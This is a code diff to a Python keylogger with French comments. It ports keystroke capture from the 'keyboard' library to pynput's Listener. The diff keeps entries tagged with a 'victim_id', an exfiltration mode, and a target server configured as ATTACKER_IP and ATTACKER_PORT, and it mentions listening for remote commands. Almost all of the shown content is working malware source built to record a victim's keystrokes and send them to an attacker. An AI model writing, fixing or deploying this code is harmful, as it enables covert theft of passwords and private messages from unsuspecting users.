@@ -14,9 +14,9 @@ from threading import Thread
 import os
 
 try:
-    import keyboard
+    from pynput import keyboard
 except ImportError:
-    print("Erreur: keyboard n'est pas installé. Exécutez: pip install -r requirements.txt")
+    print("Erreur: pynput n'est pas installé. Exécutez: pip install -r requirements.txt")
     exit(1)
 
 import config
@@ -35,47 +35,42 @@ class Keylogger:
         print(f"[+] Mode d'exfiltration: {self.mode}")
         print(f"[+] Serveur cible: {config.ATTACKER_IP}:{config.ATTACKER_PORT}")
     
-    def normalize_key(self, event):
+    def normalize_key(self, key):
         """
         Normalise les touches capturées en chaînes de caractères lisibles
         """
         try:
-            # keyboard retourne un objet KeyboardEvent avec 'name' et 'event_type'
-            key_name = event.name.lower()
-            
             # Touches spéciales
             special_keys = {
-                'space': ' ',
-                'enter': '\n',
-                'return': '\n',
-                'tab': '\t',
-                'backspace': '[BACKSPACE]',
-                'delete': '[DELETE]',
-                'shift': '[SHIFT]',
-                'ctrl': '[CTRL]',
-                'alt': '[ALT]',
-                'esc': '[ESC]',
-                'escape': '[ESC]',
-                'up': '[UP]',
-                'down': '[DOWN]',
-                'left': '[LEFT]',
-                'right': '[RIGHT]',
+                keyboard.Key.space: ' ',
+                keyboard.Key.enter: '\n',
+                keyboard.Key.tab: '\t',
+                keyboard.Key.backspace: '[BACKSPACE]',
+                keyboard.Key.delete: '[DELETE]',
+                keyboard.Key.shift: '[SHIFT]',
+                keyboard.Key.ctrl: '[CTRL]',
+                keyboard.Key.alt: '[ALT]',
+                keyboard.Key.esc: '[ESC]',
+                keyboard.Key.up: '[UP]',
+                keyboard.Key.down: '[DOWN]',
+                keyboard.Key.left: '[LEFT]',
+                keyboard.Key.right: '[RIGHT]',
             }
             
-            if key_name in special_keys:
-                return special_keys[key_name]
+            if key in special_keys:
+                return special_keys[key]
             
-            # Si c'est un caractère simple (longueur 1), le retourner tel quel
-            if len(key_name) == 1:
-                return key_name
+            # Touches avec caractères
+            if hasattr(key, 'char') and key.char:
+                return key.char
             
-            # Pour les autres touches, retourner le nom entre crochets
-            return f"[{key_name.upper()}]"
+            # Autres touches
+            return str(key).replace('Key.', '')
         
         except Exception as e:
             return f"[KEY_ERROR:{str(e)}]"
     
-    def on_press(self, event):
+    def on_press(self, key):
         """
         Callback appelé à chaque frappe de touche
         """
@@ -83,13 +78,12 @@ class Keylogger:
             return
         
         try:
-            # keyboard.on_press ne déclenche que sur les pressions
-            normalized_key = self.normalize_key(event)
+            normalized_key = self.normalize_key(key)
             log_entry = {
                 "victim_id": self.victim_id,
                 "timestamp": datetime.now().isoformat(),
                 "key": normalized_key,
-                "raw_key": event.name if hasattr(event, 'name') else str(event)
+                "raw_key": str(key)
             }
             
             # Ajouter à la queue et au buffer
@@ -365,21 +359,14 @@ class Keylogger:
         print("[+] Écoute des commandes distantes activée")
         
         try:
-            # Enregistrer le hook pour capturer les frappes
-            keyboard.on_press(self.on_press)
-            
-            # Attendre indéfiniment (ou jusqu'à Ctrl+C)
-            keyboard.wait()
+            # Écouter les frappes
+            with keyboard.Listener(on_press=self.on_press) as listener:
+                listener.join()
         
         except KeyboardInterrupt:
             print("\n[!] Arrêt du keylogger...")
-            keyboard.unhook_all()
             self.stop_capture()
             print("[+] Keylogger arrêté")
-        except Exception as e:
-            print(f"[-] Erreur inattendue: {e}")
-            keyboard.unhook_all()
-            self.stop_capture()
 
 
 if __name__ == "__main__":
